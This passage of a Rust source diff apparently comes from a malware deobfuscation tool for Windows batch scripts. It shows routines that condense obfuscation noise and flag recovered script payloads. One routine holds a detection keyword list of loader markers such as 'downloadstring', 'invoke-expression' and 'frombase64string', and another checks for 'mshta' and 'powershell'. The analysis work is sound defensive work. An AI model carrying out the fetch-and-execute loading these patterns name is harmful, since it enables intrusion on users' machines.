+        || !name.starts_with('_')
+        || value.is_empty()
+        || value.len() > 160
+        || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+        || !value
+            .bytes()
+            .all(|b| b.is_ascii_hexdigit() || b" \t()+-*/%&|^~<>xX".contains(&b))
+    {
+        return false;
+    }
+
+    let percent_ref = format!("%{name}%");
+    let bang_ref = format!("!{name}!");
+    !contains_ascii_case_insensitive_bytes(text.as_bytes(), percent_ref.as_bytes())
+        && !contains_ascii_case_insensitive_bytes(text.as_bytes(), bang_ref.as_bytes())
+}
+
+fn set_arithmetic_assignment(command: &str) -> Option<(&str, &str)> {
+    let trimmed = command.trim_start_matches(|c: char| {
+        c == '@' || c == '(' || c == ';' || c == ',' || c.is_whitespace()
+    });
+    let rest = crate::handlers::util::strip_keyword_ci(trimmed, "set", b"=/ \t")?;
+    let rest = rest.trim_start();
+    let rest = rest
+        .strip_prefix("/a")
+        .or_else(|| rest.strip_prefix("/A"))?;
+    let rest = rest.trim_start();
+    let (name, value) = if let Some(quoted) = rest.strip_prefix('"') {
+        let (inner, _tail) = quoted.split_once('"').unwrap_or((quoted, ""));
+        inner.split_once('=')?
+    } else {
+        rest.split_once('=')?
+    };
+    let name = name.trim();
+    if name.is_empty() {
+        return None;
+    }
+    Some((name, value))
+}
+
+fn is_common_environment_assignment_name(name: &str) -> bool {
+    matches!(
+        name.to_ascii_lowercase().as_str(),
+        "allusersprofile"
+            | "appdata"
+            | "cd"
+            | "cmdcmdline"
+            | "comspec"
+            | "errorlevel"
+            | "home"
+            | "homedrive"
+            | "homepath"
+            | "localappdata"
+            | "number_of_processors"
+            | "os"
+            | "path"
+            | "pathext"
+            | "processor_architecture"
+            | "programdata"
+            | "programfiles"
+            | "public"
+            | "systemdrive"
+            | "systemroot"
+            | "temp"
+            | "tmp"
+            | "userdomain"
+            | "username"
+            | "userprofile"
+            | "windir"
+    )
+}
+
+fn suppress_dense_extracted_script_set_fragment_lines(text: &str, env: &mut Environment) -> String {
+    let has_extracted_script_payload = !env.all_extracted_ps1.is_empty()
+        || !env.all_extracted_jscript.is_empty()
+        || !env.all_extracted_vbs.is_empty();
+    let has_recovered_script_payload = !env.recovered_pe.is_empty()
+        || env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::MultiStageEncryptedDropper {
+                    assemblies_recovered: Some(count),
+                    ..
+                } if *count > 0
+            )
+        });
+    if !has_extracted_script_payload && !has_recovered_script_payload {
+        return text.to_string();
+    }
+
+    let mut fragment_lines = 0usize;
+    let mut fragment_bytes = 0usize;
+    for line in text.lines() {
+        if is_dense_script_set_fragment_line(line) {
+            fragment_lines += 1;
+            fragment_bytes += line.len();
+        }
+    }
+    let has_rendered_script_command =
+        crate::util::contains_ascii_case_insensitive(text, "powershell")
+            || crate::util::contains_ascii_case_insensitive(text, "wscript")
+            || crate::util::contains_ascii_case_insensitive(text, "cscript")
+            || crate::util::contains_ascii_case_insensitive(text, "mshta");
+    let fragment_line_threshold = if has_recovered_script_payload || has_rendered_script_command {
+        4
+    } else {
+        64
+    };
+    let fragment_byte_threshold = if has_recovered_script_payload {
+        128
+    } else {
+        2048
+    };
+    if fragment_lines < fragment_line_threshold || fragment_bytes < fragment_byte_threshold {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut omitted = 0usize;
+    let mut omitted_bytes = 0usize;
+    let mut summary_inserted = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if is_dense_script_set_fragment_line(body) {
+            if !summary_inserted {
+                out.push_str(&format!(
+                    "rem omitted dense extracted-script set fragment lines{}",
+                    ending
+                ));
+                summary_inserted = true;
+            }
+            rescue_truncated_urls(body, body.len(), env);
+            omitted += 1;
+            omitted_bytes += line.len();
+            continue;
+        }
+        out.push_str(line);
+    }
+
+    if omitted == 0 {
+        return text.to_string();
+    }
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: omitted_bytes as u64,
+    });
+    out.push_str(&format!(
+        "rem omitted {omitted} dense extracted-script set fragment lines ({omitted_bytes} bytes)\r\n"
+    ));
+    out
+}
+
+fn summarize_redundant_long_script_set_value_lines(text: &str, env: &mut Environment) -> String {
+    if env.all_extracted_ps1.is_empty()
+        && env.all_extracted_jscript.is_empty()
+        && env.all_extracted_vbs.is_empty()
+    {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        let Some(value) = redundant_long_script_set_value(body, text) else {
+            out.push_str(line);
+            continue;
+        };
+        rescue_truncated_urls(value, value.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: value.len() as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted redundant long script SET value ({} bytes; value rendered later){}",
+            value.len(),
+            ending
+        ));
+        changed = true;
+    }
+
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn redundant_long_script_set_value<'a>(line: &'a str, text: &'a str) -> Option<&'a str> {
+    let (_name, value) = set_assignment(line)?;
+    let value = strip_outer_set_quotes(value.trim());
+    if value.len() < 512 || value.contains('\n') || !long_set_value_has_script_loader_atoms(value) {
+        return None;
+    }
+    (text.matches(value).take(2).count() >= 2).then_some(value)
+}
+
+fn long_set_value_has_script_loader_atoms(value: &str) -> bool {
+    let lower = value.to_ascii_lowercase();
+    [
+        "frombase64string",
+        "gzipstream",
+        "reflection.assembly",
+        "system.security.cryptography",
+        "new-object system.io",
+        "downloadstring",
+        "downloadfile",
+        "invoke-expression",
+    ]
+    .iter()
+    .any(|needle| lower.contains(needle))
+}
+
+fn summarize_conditional_numeric_set_staging_runs(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_conditional_numeric_set_staging_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        flush_conditional_numeric_set_staging_run(&mut out, &mut pending, &mut pending_lines, env);
+        out.push_str(line);
+    }
+    flush_conditional_numeric_set_staging_run(&mut out, &mut pending, &mut pending_lines, env);
+    out
+}
+
+fn flush_conditional_numeric_set_staging_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    if *pending_lines >= 32 && pending.len() >= 1024 {
+        let ending = pending
+            .lines()
+            .next()
+            .and_then(|line| {
+                if line.ends_with('\r') {
+                    Some("\r\n")
+                } else {
+                    None
+                }
+            })
+            .unwrap_or("\r\n");
+        out.push_str(&format!(
+            "rem omitted {} conditional numeric set staging lines ({} bytes){}",
+            *pending_lines,
+            pending.len(),
+            ending
+        ));
+        rescue_truncated_urls(pending, pending.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.len() as u64,
+        });
+    } else {
+        out.push_str(pending);
+    }
+    pending.clear();
+    *pending_lines = 0;
+}
+
+fn summarize_numeric_label_dispatch_scaffolding(text: &str, env: &mut Environment) -> String {
+    let mut numeric_labels = 0usize;
+    let mut numeric_or_punct_gotos = 0usize;
+    let mut dispatch_arithmetic = 0usize;
+
+    for line in text.lines() {
+        if is_numeric_label_line(line) {
+            numeric_labels += 1;
+        } else if is_numeric_or_punctuation_goto_line(line) {
+            numeric_or_punct_gotos += 1;
+        } else if is_rendered_dispatch_arithmetic_line(line) {
+            dispatch_arithmetic += 1;
+        }
+    }
+
+    if numeric_labels < 32 || numeric_or_punct_gotos < 16 || dispatch_arithmetic < 8 {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_numeric_label_dispatch_scaffold_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        flush_numeric_label_dispatch_scaffold_run(&mut out, &mut pending, &mut pending_lines, env);
+        out.push_str(line);
+    }
+    flush_numeric_label_dispatch_scaffold_run(&mut out, &mut pending, &mut pending_lines, env);
+    out
+}
+
+fn flush_numeric_label_dispatch_scaffold_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    if *pending_lines >= 6 {
+        let ending = pending
+            .lines()
+            .next()
+            .and_then(|line| line.ends_with('\r').then_some("\r\n"))
+            .unwrap_or("\r\n");
+        out.push_str(&format!(
+            "rem omitted numeric-label arithmetic dispatch scaffold ({} lines, {} bytes){}",
+            *pending_lines,
+            pending.len(),
+            ending
+        ));
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.len() as u64,
+        });
+    } else {
+        out.push_str(pending);
+    }
+    pending.clear();
+    *pending_lines = 0;
+}
+
+fn is_numeric_label_dispatch_scaffold_line(line: &str) -> bool {
+    is_numeric_label_line(line)
+        || is_numeric_or_punctuation_goto_line(line)
+        || is_rendered_dispatch_arithmetic_line(line)
+        || is_short_dispatch_set_assignment_line(line)
+}
+
+fn is_numeric_label_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    let Some(rest) = trimmed.strip_prefix(':') else {
+        return false;
+    };
+    !rest.is_empty() && rest.bytes().all(|b| b.is_ascii_digit())
+}
+
+fn is_numeric_or_punctuation_goto_line(line: &str) -> bool {
+    let trimmed = line.trim_start().trim_start_matches('@').trim_start();
+    let lower = trimmed.to_ascii_lowercase();
+    let Some(rest) = lower.strip_prefix("goto") else {
+        return false;
+    };
+    let rest = rest.trim();
+    if rest.is_empty() {
+        return false;
+    }
+    let target = rest
+        .trim_start_matches(|c: char| c.is_ascii_whitespace() || c == ',' || c == ';' || c == ':');
+    target.bytes().all(|b| b.is_ascii_digit())
+        || rest
+            .bytes()
+            .all(|b| b.is_ascii_whitespace() || b == b',' || b == b';')
+}
+
+fn is_rendered_dispatch_arithmetic_line(line: &str) -> bool {
+    let trimmed = line.trim_start().trim_start_matches('@').trim_start();
+    let lower = trimmed.to_ascii_lowercase();
+    let Some(rest) = lower.strip_prefix("set") else {
+        return false;
+    };
+    let rest = rest.trim_start();
+    let Some(rest) = rest.strip_prefix("/a") else {
+        return false;
+    };
+    looks_like_dispatch_arithmetic_expr(rest.trim_start())
+}
+
+fn is_short_dispatch_set_assignment_line(line: &str) -> bool {
+    let trimmed = line.trim_start().trim_start_matches('@').trim_start();
+    let lower = trimmed.to_ascii_lowercase();
+    let Some(rest) = lower.strip_prefix("set") else {
+        return false;
+    };
+    let rest = rest.trim_start();
+    if rest.starts_with("/a") {
+        return false;
+    }
+    let assignment = rest.trim().trim_matches('"');
+    let Some((name, value)) = assignment.split_once('=') else {
+        return false;
+    };
+    let name = name.trim();
+    let value = value.trim();
+    !name.is_empty()
+        && name.len() <= 4
+        && !value.is_empty()
+        && value.len() <= 4
+        && name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
+        && value
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b == b'_')
+}
+
+fn is_conditional_numeric_set_staging_line(line: &str) -> bool {
+    let trimmed = line.trim_start().trim_start_matches('@').trim_start();
+    let lower = trimmed.to_ascii_lowercase();
+    if !lower.starts_with("if ") {
+        return false;
+    }
+    let Some(set_idx) = lower.find("set _") else {
+        return false;
+    };
+    if !contains_numeric_underscore_set_assignment(&lower[set_idx..]) {
+        return false;
+    }
+    let condition = lower["if ".len()..set_idx]
+        .trim()
+        .trim_start_matches("not ")
+        .trim();
+    let Some((left, right)) = condition.split_once("==") else {
+        return false;
+    };
+    let left = left.trim_matches(|c: char| c.is_ascii_whitespace() || c == '(' || c == ')');
+    let right = right.trim_matches(|c: char| c.is_ascii_whitespace() || c == '(' || c == ')');
+    !left.is_empty()
+        && !right.is_empty()
+        && left.chars().all(|c| c.is_ascii_digit())
+        && right.chars().all(|c| c.is_ascii_digit())
+}
+
+fn contains_numeric_underscore_set_assignment(text: &str) -> bool {
+    let bytes = text.as_bytes();
+    let mut idx = 0usize;
+    while idx < bytes.len() {
+        let Some(relative) = text[idx..].find("set _") else {
+            return false;
+        };
+        let start = idx + relative + "set _".len();
+        let mut pos = start;
+        while pos < bytes.len() && bytes[pos].is_ascii_digit() {
+            pos += 1;
+        }
+        if pos > start && bytes.get(pos) == Some(&b'=') {
+            return true;
+        }
+        idx = start;
+    }
+    false
+}
+
+fn is_dense_script_set_fragment_line(line: &str) -> bool {
+    let Some((name, value)) = set_assignment(line) else {
+        return false;
+    };
+    if name.chars().count() < 4 || !is_dense_script_set_fragment_name(name) {
+        return false;
+    }
+    let value = strip_outer_set_quotes(value.trim());
+    if !(1..=4096).contains(&value.len()) || value.contains("://") {
+        return false;
+    }
+    value
+        .chars()
+        .all(|c| c.is_ascii_graphic() || c.is_ascii_whitespace())
+}
+
+fn is_dense_script_set_fragment_name(name: &str) -> bool {
+    name.chars().all(|c| {
+        c == '_'
+            || c.is_ascii_alphanumeric()
+            || (!c.is_ascii()
+                && !c.is_control()
+                && !matches!(
+                    c,
+                    '%' | '!' | '<' | '>' | '|' | '&' | '"' | '\'' | '=' | '^'
+                ))
+    })
+}
+
+fn strip_embedded_csharp_batch_string_wrappers(text: &str) -> String {
+    if !text.contains("public static string") || !text.contains("= @\"@") {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    let mut in_embedded_batch = false;
+    for line in text.split_inclusive('\n') {
+        let (body, eol) = split_line_ending(line);
+        if let Some((name, echo_line)) = csharp_batch_string_header(body) {
+            out.push_str("rem embedded C# batch string ");
+            out.push_str(name);
+            out.push_str(eol);
+            out.push_str(echo_line);
+            out.push_str(eol);
+            in_embedded_batch = true;
+            changed = true;
+            continue;
+        }
+
+        if in_embedded_batch {
+            let trimmed = body.trim_end();
+            if let Some(stripped) = trimmed.strip_suffix("\";") {
+                let leading_len = body.len() - body.trim_start().len();
+                let trailing_len = body.len() - trimmed.len();
+                let command = csharp_verbatim_string_unescape(stripped.trim_end());
+                if !command.trim().is_empty() {
+                    out.push_str(&body[..leading_len]);
+                    out.push_str(&command);
+                    out.push_str(&body[body.len() - trailing_len..]);
+                    out.push_str(eol);
+                }
+                in_embedded_batch = false;
+                changed = true;
+                continue;
+            }
+            out.push_str(&csharp_verbatim_string_unescape(body));
+            out.push_str(eol);
+            changed = true;
+            continue;
+        }
+
+        let trimmed = body.trim();
+        if trimmed == "\";" {
+            changed = true;
+            continue;
+        }
+        if trimmed.eq_ignore_ascii_case("exit\";") {
+            let leading_len = body.len() - body.trim_start().len();
+            out.push_str(&body[..leading_len]);
+            out.push_str("exit");
+            out.push_str(eol);
+            changed = true;
+            continue;
+        }
+
+        out.push_str(line);
+    }
+
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn csharp_verbatim_string_unescape(text: &str) -> String {
+    if text.contains("\"\"") {
+        text.replace("\"\"", "\"")
+    } else {
+        text.to_string()
+    }
+}
+
+fn summarize_embedded_csharp_residual_data_rows(text: &str, env: &mut Environment) -> String {
+    const MIN_RUN: usize = 2;
+
+    if !text.contains("rem embedded C# batch string ") {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len());
+    let mut pending_text = String::new();
+    let mut pending_lines = 0usize;
+    let mut pending_bytes = 0usize;
+    let mut pending_ending = "\n";
+
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if is_embedded_csharp_residual_data_row(body) {
+            pending_text.push_str(line);
+            pending_lines += 1;
+            pending_bytes += line.len();
+            if ending == "\r\n" {
+                pending_ending = "\r\n";
+            }
+            continue;
+        }
+        flush_embedded_csharp_residual_data_rows(
+            &mut out,
+            &mut pending_text,
+            &mut pending_lines,
+            &mut pending_bytes,
+            &mut pending_ending,
+            MIN_RUN,
+            env,
+        );
+        out.push_str(line);
+    }
+    flush_embedded_csharp_residual_data_rows(
+        &mut out,
+        &mut pending_text,
+        &mut pending_lines,
+        &mut pending_bytes,
+        &mut pending_ending,
+        MIN_RUN,
+        env,
+    );
+    out
+}
+
+fn flush_embedded_csharp_residual_data_rows(
+    out: &mut String,
+    pending_text: &mut String,
+    pending_lines: &mut usize,
+    pending_bytes: &mut usize,
+    pending_ending: &mut &str,
+    min_run: usize,
+    env: &mut Environment,
+) {
+    if *pending_lines == 0 {
+        return;
+    }
+    if *pending_lines >= min_run {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: *pending_bytes as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {} embedded C# residual data rows ({} bytes){}",
+            *pending_lines, *pending_bytes, *pending_ending
+        ));
+    } else {
+        out.push_str(pending_text);
+    }
+    pending_text.clear();
+    *pending_lines = 0;
+    *pending_bytes = 0;
+    *pending_ending = "\n";
+}
+
+fn is_embedded_csharp_residual_data_row(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.is_empty() || starts_with_embedded_batch_command_word(trimmed) {
+        return false;
+    }
+    let Some(unquoted) = trimmed
+        .strip_suffix(',')
+        .unwrap_or(trimmed)
+        .trim_end()
+        .strip_suffix('"')
+    else {
+        return false;
+    };
+    unquoted.starts_with('\\')
+        || (unquoted.starts_with('{')
+            && unquoted
+                .find('}')
+                .is_some_and(|idx| unquoted[idx + 1..].starts_with('\\')))
+}
+
+fn starts_with_embedded_batch_command_word(line: &str) -> bool {
+    let command = line
+        .trim_start_matches('@')
+        .split(|ch: char| ch.is_ascii_whitespace() || matches!(ch, '/' | '"'))
+        .next()
+        .unwrap_or_default();
+    matches!(
+        command.to_ascii_lowercase().as_str(),
+        "assoc"
+            | "attrib"
+            | "call"
+            | "cd"
+            | "copy"
+            | "del"
+            | "dir"
+            | "echo"
+            | "erase"
+            | "for"
+            | "goto"
+            | "if"
+            | "md"
+            | "mkdir"
+            | "move"
+            | "net"
+            | "netsh"
+            | "pause"
+            | "ping"
+            | "pushd"
+            | "rd"
+            | "reg"
+            | "ren"
+            | "rmdir"
+            | "sc"
+            | "set"
+            | "setlocal"
+            | "start"
+            | "taskkill"
+            | "timeout"
+            | "type"
+    )
+}
+
+fn csharp_batch_string_header(body: &str) -> Option<(&str, &str)> {
+    let trimmed = body.trim_start();
+    let rest = trimmed.strip_prefix("public static string ")?;
+    let mut split = rest.splitn(2, |c: char| c.is_ascii_whitespace() || c == '=');
+    let name = split.next()?.trim();
+    if name.is_empty() || !name.chars().all(|c| c == '_' || c.is_ascii_alphanumeric()) {
+        return None;
+    }
+    let marker_pos = trimmed.find("= @\"")?;
+    let after_marker = &trimmed[marker_pos + "= @\"".len()..];
+    if after_marker
+        .get(..9)
+        .is_some_and(|head| head.eq_ignore_ascii_case("@echo off"))
+    {
+        Some((name, &after_marker[..9]))
+    } else {
+        None
+    }
+}
+
+fn coalesce_repeated_output_lines(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending_body = String::new();
+    let mut pending_line = String::new();
+    let mut pending_count = 0usize;
+    let mut pending_bytes = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if !pending_body.is_empty() && body == pending_body {
+            pending_count += 1;
+            pending_bytes += line.len();
+            continue;
+        }
+        flush_repeated_output_line_run(
+            &mut out,
+            &mut pending_body,
+            &mut pending_line,
+            &mut pending_count,
+            &mut pending_bytes,
+            env,
+        );
+        pending_body.clear();
+        pending_body.push_str(body);
+        pending_line.clear();
+        pending_line.push_str(line);
+        pending_count = 1;
+        pending_bytes = line.len();
+    }
+    flush_repeated_output_line_run(
+        &mut out,
+        &mut pending_body,
+        &mut pending_line,
+        &mut pending_count,
+        &mut pending_bytes,
+        env,
+    );
+    out
+}
+
+fn coalesce_adjacent_idempotent_command_duplicates(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut previous_key: Option<String> = None;
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        let key = idempotent_duplicate_command_key(body);
+        if key.is_some() && key == previous_key {
+            changed = true;
+            continue;
+        }
+        out.push_str(line);
+        previous_key = key;
+    }
+
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn idempotent_duplicate_command_key(line: &str) -> Option<String> {
+    let trimmed = line.trim();
+    if trimmed.is_empty() {
+        return None;
+    }
+    if set_assignment(trimmed).is_some() {
+        return Some(format!("set:{trimmed}"));
+    }
+    let lower = trimmed.to_ascii_lowercase();
+    if lower == "title" || lower.starts_with("title ") {
+        return Some(format!("title:{trimmed}"));
+    }
+    None
+}
+
+fn summarize_repeated_colon_marker_lines(text: &str, env: &mut Environment) -> String {
+    const MIN_RUN: usize = 8;
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_colon_marker_noise_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        flush_repeated_colon_marker_run(&mut out, &mut pending, &mut pending_lines, MIN_RUN, env);
+        out.push_str(line);
+    }
+    flush_repeated_colon_marker_run(&mut out, &mut pending, &mut pending_lines, MIN_RUN, env);
+    out
+}
+
+fn flush_repeated_colon_marker_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    min_run: usize,
+    env: &mut Environment,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    if *pending_lines >= min_run {
+        rescue_truncated_urls(pending, pending.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.len() as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {} repeated colon marker lines ({} bytes)\r\n",
+            *pending_lines,
+            pending.len()
+        ));
+    } else {
+        out.push_str(pending);
+    }
+    pending.clear();
+    *pending_lines = 0;
+}
+
+fn is_colon_marker_noise_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    let Some(marker) = trimmed.strip_prefix(':') else {
+        return false;
+    };
+    if marker.len() < 16 || marker.starts_with(':') || marker.contains("://") {
+        return false;
+    }
+    let mut chars = marker.chars();
+    let Some(first) = chars.next() else {
+        return false;
+    };
+    !first.is_ascii_alphanumeric()
+        && !matches!(first, '_' | '-' | '.')
+        && chars.all(|ch| ch == first)
+}
+
+fn strip_repeated_vbs_msgbox_noop_fragments(text: &str, env: &mut Environment) -> Option<String> {
+    use once_cell::sync::Lazy;
+
+    static VBS_MSGBOX_NOOP_RE: Lazy<Option<regex::Regex>> = Lazy::new(|| {
+        regex::Regex::new(
+            r#"(?i)(?::\s*)?If\s+[A-Za-z][A-Za-z0-9_]{2,80}\s*=\s*"[^"\r\n]{1,80}"\s+then\s+msgbox\s+"[^"\r\n]{1,160}"\s+End\s+If(?::\s*)?"#,
+        )
+        .ok()
+    });
+    const MIN_FRAGMENTS: usize = 8;
+
+    let noop_re = VBS_MSGBOX_NOOP_RE.as_ref()?;
+
+    let fragments = noop_re.find_iter(text).count();
+    if fragments < MIN_FRAGMENTS {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    let mut omitted_bytes = 0usize;
+    let mut omitted_lines = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        let line_fragments: Vec<_> = noop_re.find_iter(body).collect();
+        if line_fragments.is_empty() {
+            out.push_str(line);
+            continue;
+        }
+
+        let removed: usize = line_fragments.iter().map(|m| m.as_str().len()).sum();
+        let cleaned = noop_re.replace_all(body, "");
+        let cleaned = collapse_redundant_vbs_fragment_separators(cleaned.trim_end());
+        if is_empty_echo_after_vbs_fragment_strip(&cleaned) {
+            out.push_str(&format!(
+                "rem omitted VBS MsgBox no-op echo line ({} bytes){}",
+                body.len(),
+                ending
+            ));
+            omitted_lines += 1;
+            omitted_bytes += body.len();
+        } else {
+            out.push_str(&cleaned);
+            out.push_str(ending);
+            omitted_bytes += removed;
+        }
+        changed = true;
+    }
+
+    if changed {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: omitted_bytes as u64,
+        });
+        if omitted_lines >= 2 {
+            out = coalesce_vbs_msgbox_noop_echo_summaries(&out, env).unwrap_or(out);
+        }
+        Some(out)
+    } else {
+        None
+    }
+}
+
+fn collapse_redundant_vbs_fragment_separators(text: &str) -> String {
+    let mut out = text.trim().to_string();
+    while out.contains("::") {
+        out = out.replace("::", ":");
+    }
+    out.trim_matches(':').trim().to_string()
+}
+
+fn is_empty_echo_after_vbs_fragment_strip(line: &str) -> bool {
+    let trimmed = line.trim();
+    let command = trimmed.strip_prefix('@').unwrap_or(trimmed).trim_start();
+    let Some(rest) = command
+        .strip_prefix("echo")
+        .or_else(|| command.strip_prefix("ECHO"))
+    else {
+        return trimmed.is_empty();
+    };
+    rest.trim().is_empty()
+}
+
+fn coalesce_vbs_msgbox_noop_echo_summaries(text: &str, _env: &mut Environment) -> Option<String> {
+    let mut out = String::with_capacity(text.len());
+    let mut pending_lines = 0usize;
+    let mut pending_bytes = 0usize;
+    let mut pending_ending = "\n";
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if let Some(bytes) = parse_vbs_msgbox_noop_echo_summary(body) {
+            pending_lines += 1;
+            pending_bytes += bytes;
+            if ending == "\r\n" {
+                pending_ending = "\r\n";
+            }
+            continue;
+        }
+        flush_vbs_msgbox_noop_echo_summary_run(
+            &mut out,
+            &mut pending_lines,
+            &mut pending_bytes,
+            &mut pending_ending,
+            &mut changed,
+        );
+        out.push_str(line);
+    }
+    flush_vbs_msgbox_noop_echo_summary_run(
+        &mut out,
+        &mut pending_lines,
+        &mut pending_bytes,
+        &mut pending_ending,
+        &mut changed,
+    );
+    changed.then_some(out)
+}
+
+fn flush_vbs_msgbox_noop_echo_summary_run(
+    out: &mut String,
+    pending_lines: &mut usize,
+    pending_bytes: &mut usize,
+    pending_ending: &mut &'static str,
+    changed: &mut bool,
+) {
+    if *pending_lines == 0 {
+        return;
+    }
+    if *pending_lines >= 2 {
+        out.push_str(&format!(
+            "rem omitted {} VBS MsgBox no-op echo lines ({} bytes){}",
+            *pending_lines, *pending_bytes, *pending_ending
+        ));
+        *changed = true;
+    } else {
+        out.push_str(&format!(
+            "rem omitted VBS MsgBox no-op echo line ({} bytes){}",
+            *pending_bytes, *pending_ending
+        ));
+    }
+    *pending_lines = 0;
+    *pending_bytes = 0;
+    *pending_ending = "\n";
+}
+
+fn parse_vbs_msgbox_noop_echo_summary(line: &str) -> Option<usize> {
+    let trimmed = line.trim();
+    let bytes = trimmed
+        .strip_prefix("rem omitted VBS MsgBox no-op echo line (")?
+        .strip_suffix(" bytes)")?;
+    bytes.parse().ok()
+}
+
+fn summarize_spaced_hex_blob_lines(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_spaced_hex_blob_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        flush_spaced_hex_blob_run(&mut out, &mut pending, &mut pending_lines, env);
+        out.push_str(line);
+    }
+    flush_spaced_hex_blob_run(&mut out, &mut pending, &mut pending_lines, env);
+    out
+}
+
+fn flush_spaced_hex_blob_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    rescue_truncated_urls(pending, pending.len(), env);
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: pending.len() as u64,
+    });
+    out.push_str(&format!(
+        "rem omitted {} spaced-hex blob lines ({} bytes)\r\n",
+        *pending_lines,
+        pending.len()
+    ));
+    pending.clear();
+    *pending_lines = 0;
+}
+
+fn is_spaced_hex_blob_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.len() < 160
+        || trimmed.starts_with("rem omitted ")
+        || trimmed.contains("://")
+        || trimmed.contains('=')
+    {
+        return false;
+    }
+    if let Some(name) = interp::command_name(trimmed) {
+        if crate::handlers::lookup(&name).is_some() {
+            return false;
+        }
+    }
+
+    let mut tokens = 0usize;
+    for token in trimmed.split_whitespace() {
+        if token.len() != 2 || !token.bytes().all(|byte| byte.is_ascii_hexdigit()) {
+            return false;
+        }
+        tokens += 1;
+    }
+
+    tokens >= 48
+}
+
+fn flush_repeated_output_line_run(
+    out: &mut String,
+    pending_body: &mut String,
+    pending_line: &mut String,
+    pending_count: &mut usize,
+    pending_bytes: &mut usize,
+    env: &mut Environment,
+) {
+    if pending_line.is_empty() {
+        return;
+    }
+    if is_spaced_hex_blob_line(pending_body) {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: *pending_bytes as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {} spaced-hex blob lines ({} bytes)\r\n",
+            *pending_count, *pending_bytes
+        ));
+    } else if *pending_count >= MIN_REPEAT_LINES_FOR_OUTPUT_COALESCE
+        && pending_body.len() >= MIN_REPEATED_OUTPUT_LINE_LEN
+        && !is_binary_noise_line(pending_body)
+    {
+        out.push_str(pending_line);
+        let omitted = pending_count.saturating_sub(1);
+        let omitted_bytes = pending_bytes.saturating_sub(pending_line.len());
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: omitted_bytes as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {omitted} repeated identical output lines ({omitted_bytes} bytes)\r\n"
+        ));
+    } else {
